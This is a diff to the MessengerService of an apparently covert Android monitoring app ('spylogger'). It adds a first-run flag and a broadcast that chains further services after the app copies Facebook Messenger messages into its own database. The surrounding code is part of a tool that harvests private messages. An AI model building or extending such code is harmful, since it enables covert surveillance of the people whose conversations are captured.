@@ -21,6 +21,7 @@ import com.gravatasufoca.spylogger.model.messenger.Messages;
 import com.gravatasufoca.spylogger.model.messenger.Prefs;
 import com.gravatasufoca.spylogger.model.messenger.Sender;
 import com.gravatasufoca.spylogger.model.messenger.Thread;
+import com.gravatasufoca.spylogger.receivers.PrimeiraCarga;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.j256.ormlite.dao.Dao;
 import com.j256.ormlite.dao.GenericRawResults;
@@ -50,6 +51,7 @@ public class MessengerService extends Service {
     private DatabaseHelperFacebookThreads external;
     private final IBinder mBinder = new LocalBinder();
     private Contact proprietario;
+    private boolean primeiraVez;
 
     public class LocalBinder extends Binder {
         MessengerService getService() {
@@ -99,6 +101,9 @@ public class MessengerService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        if(intent!=null){
+            primeiraVez=intent.getBooleanExtra("primeiraVez",false);
+        }
         if ((new File(DatabaseHelperFacebookThreads.DATABASE_NAME)).exists()) {
             Log.d("FACESLOG - FLAGS", Integer.toString(flags));
             Utils.context = getApplicationContext();
@@ -108,6 +113,8 @@ public class MessengerService extends Service {
                 setObserver();
 
             Log.d("FACESLOG - OBSESRVER", Utils.faceObserver.toString());
+        }else{
+            continuarServicos();
         }
         return START_REDELIVER_INTENT;
     }
@@ -262,6 +269,7 @@ public class MessengerService extends Service {
                     dbHelper.getDao(Mensagem.class).create(mensagens);
                 }
             }
+            continuarServicos();
 
             Log.i(this.getClass().getSimpleName(), "TERMINOU");
         } catch (Exception e) {
@@ -273,7 +281,13 @@ public class MessengerService extends Service {
             }
         }
     }
-
+    private void continuarServicos(){
+        if(primeiraVez){
+            Intent intent = new Intent(Utils.PRIMEIRA_CARGA);
+            intent.putExtra(PrimeiraCarga.INICIALIZAR,true);
+            sendBroadcast(intent);
+        }
+    }
     private Contact getProprietario(Context context) {
         try {
 
